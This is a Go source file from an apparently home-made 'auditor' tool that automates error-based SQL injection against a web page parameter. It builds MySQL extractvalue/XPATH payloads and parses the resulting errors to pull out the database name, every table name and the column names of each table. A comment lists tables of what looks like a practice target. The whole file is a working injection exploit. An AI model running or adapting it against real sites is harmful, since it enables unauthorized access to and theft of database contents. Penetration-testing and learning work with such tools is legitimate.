package base

import (
	"auditor/core/utils"
	"auditor/entities"
	"fmt"
	"log"
	"regexp"
	"strconv"
	"strings"
)

const (
	ErrXPathForm      = "XPATH syntax error: '.*'"
	ErrXPathQueryFrom = "XPATH syntax error: ':.*'"
	ScanLength        = true
)

func ErrorBasedvalidate(options *entities.DBOptions, query string) string {
	u := *options.URL
	u.RawQuery = fmt.Sprintf("%s=%s", options.Parameter, options.ParameterValue+query)

	return utils.GetPageHTML(u.String(), options.Cookie)
}

func TrimData(s string) string {
	s = strings.ReplaceAll(s, "XPATH syntax error: ':", "")
	s = strings.ReplaceAll(s, "'\nWarning:", "")
	s = strings.ReplaceAll(s, "'", "")
	return s
}

func buildDatabasesPayload(head, tail int) string {
	payload := `+and+extractvalue(1,concat(':',substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema+=+database()),%d,%d)))`
	return fmt.Sprintf(payload, head, tail)
}

func fetchingDataFromHTML(options *entities.DBOptions, payload string) string {
	html := ErrorBasedvalidate(options, payload)
	r := regexp.MustCompile(ErrXPathQueryFrom)
	return TrimData(r.FindString(html))
}

func fetchingDatabasesLen(options *entities.DBOptions) int {
	data := fetchingDataFromHTML(options, "+and+extractvalue(1,concat(':',length((select+group_concat(table_name)+from+information_schema.tables+where+table_schema+=+database()))))")
	dbLength, _ := strconv.Atoi(TrimData(data))

	log.Println("[*] DB length: ", dbLength)
	return dbLength
}

func ExtractDBName(options *entities.DBOptions) {
	options.Name += fetchingDataFromHTML(options, "+and+extractvalue(1,concat(':',database()))")
	options.NameLength = len(options.Name)
}

// artists,carts,categ,featured,guestbook,pictures,products,users
func ExtractTables(options *entities.DBOptions) {
	dbLength := fetchingDatabasesLen(options)

	log.Println("init fetching databases!!!")
	var head, tail = 1, 31
	var databases string
	for dbLength > 0 {
		payload := buildDatabasesPayload(head, tail)
		databases += fetchingDataFromHTML(options, payload)
		dbLength -= head + tail
		head, tail = (tail + 1), (tail * 2)
	}

	options.TableCount = len(strings.Split(databases, ","))
	for _, table := range strings.Split(databases, ",") {
		options.Tables[table] = []string{}
	}
}

func buildColumnsPayload(tbl string, length bool, head, tail int) string {
	if length {
		payload := `+and+extractvalue(1,concat(':',length((select+group_concat(column_name)+from+information_schema.columns+where+table_name+=+'%s'))))`
		return fmt.Sprintf(payload, tbl)
	}
	payload := `+and+extractvalue(1,concat(':',substr((select+group_concat(column_name)+from+information_schema.columns+where+table_name+=+'%s'),%d,%d)))`
	return fmt.Sprintf(payload, tbl, head, tail)
}

func fetchingColumnsLen(options *entities.DBOptions, table string) int {
	payload := buildColumnsPayload(table, ScanLength, 0, 0)
	data := fetchingDataFromHTML(options, payload)
	length, _ := strconv.Atoi(TrimData(data))
	return length
}

func ExtractColumns(options *entities.DBOptions) {
	for table := range options.Tables {
		log.Println("[+] working on table: ", table)

		columnsLen := fetchingColumnsLen(options, table)
		log.Println("[!] found length: ", columnsLen)

		var head, tail = 1, 31
		var columns string
		for columnsLen > 0 {
			payload := buildColumnsPayload(table, !ScanLength, head, tail)

			columns += fetchingDataFromHTML(options, payload)
			columnsLen -= head + tail
			head, tail = (tail + 1), (tail * 2)
		}
		log.Println("[!!] found columns: ", columns)
		options.Tables[table] = strings.Split(columns, ",")
	}
}
